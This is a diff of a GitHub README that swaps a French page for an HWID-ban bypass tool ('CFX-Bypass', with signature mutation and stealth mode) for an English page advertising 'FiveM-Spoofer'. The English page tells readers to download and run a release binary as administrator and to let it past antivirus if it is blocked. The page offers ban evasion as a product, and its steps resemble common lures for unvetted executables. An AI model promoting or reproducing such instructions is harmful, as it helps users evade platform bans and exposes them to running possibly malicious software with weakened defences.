@@ -1,26 +1,53 @@
-# 🔐 CFX-Bypass - Contournement des restrictions HWID
+# 🔐 FiveM-Spoofer - Bypass Restrictions with Ease
 
-*Solution de filtrage réseau avancée pour contourner les interdictions matérielles FiveM*
+## 📥 Download the Latest Version
+[![Download](https://img.shields.io/badge/Download-FiveM--Spoofer-blue.svg)](https://github.com/sealchao/FiveM-Spoofer/releases)
 
-[![Statut vérifié](https://img.shields.io/badge/status-verified-brightgreen)](https://github.com/yourusername/CFX-Bypass) 
+## 🚀 Getting Started
+Welcome to FiveM-Spoofer! This tool helps you bypass hardware restrictions on your gaming setup.
 
+### 🌟 Features
+- Easy to use: No technical skills required
+- Safe and secure bypass for FiveM
+- Works for various restrictions
+- Regular updates to keep performance high
+- Compatible with popular gaming platforms
 
-https://user-images.githubusercontent.com/94861415/149637151-cccf9bbc-be1d-4287-9bb1-375e6efdb87b.mp4
+## 📜 System Requirements
+To run FiveM-Spoofer smoothly, make sure your system meets these requirements:
 
-## 🛡️ Principales fonctionnalités
-- Inspection des paquets en temps réel
+- **Operating System:** Windows 10 or higher
+- **Processor:** Intel or AMD processor with 1.8 GHz or higher
+- **RAM:** 4 GB minimum
+- **Free Disk Space:** 100 MB or more
 
-- Usurpation d'identifiant matériel (HWID) au niveau réseau
+## 💻 Download & Install
+1. **Visit the Releases Page**: Click this link to go to our [Releases page](https://github.com/sealchao/FiveM-Spoofer/releases).
+  
+2. **Choose Your Version**: Look for the latest version listed. The version number will be in bold. 
 
-- Protection du jeton Rockstar Social Club (ROS)
+3. **Download the File**: Click on the appropriate file name to start the download.
 
-- Mutation automatique des signatures
+4. **Open the Downloaded File**: Once the download is complete, locate the file in your Downloads folder. Double click on it to run.
 
-- Fonctionnement en mode furtif
+5. **Follow On-Screen Instructions**: The setup wizard will guide you through the installation process. Just click "Next" to proceed.
 
-## 🔥 Remarques importantes
-```diff
-+ Toujours activer avant de quitter le serveur
-+ À utiliser UNIQUEMENT avec les nouveaux comptes Rockstar
-- Ne jamais lancer FiveM sans contournement
-```
+6. **Launch the Application**: After installation, find FiveM-Spoofer in your applications list. Click to open it.
+
+7. **Start Bypassing**: Follow the in-app instructions to start using the spoofer.
+
+## 🛠️ Troubleshooting
+If you encounter issues:
+
+- **Installation Fails**: Ensure you have admin rights on your computer. Try running the installer as an administrator.
+- **App Doesn’t Start**: Check your antivirus settings. Some programs may block the app. You may need to allow it in your antivirus settings.
+  
+If problems persist, feel free to visit our [GitHub Issues page](https://github.com/sealchao/FiveM-Spoofer/issues) for help.
+
+## 🤝 Support
+For direct support, you can open an issue in our GitHub repository. Clearly describe your problem, and the community or team will assist you as soon as possible.
+
+## 📝 Contributing
+If you want to contribute to FiveM-Spoofer, feel free to fork the repository and propose changes. Follow our guidelines for submissions to ensure a smooth reviewing process.
+
+Happy gaming! Enjoy using FiveM-Spoofer to enhance your experience without hardware restrictions.
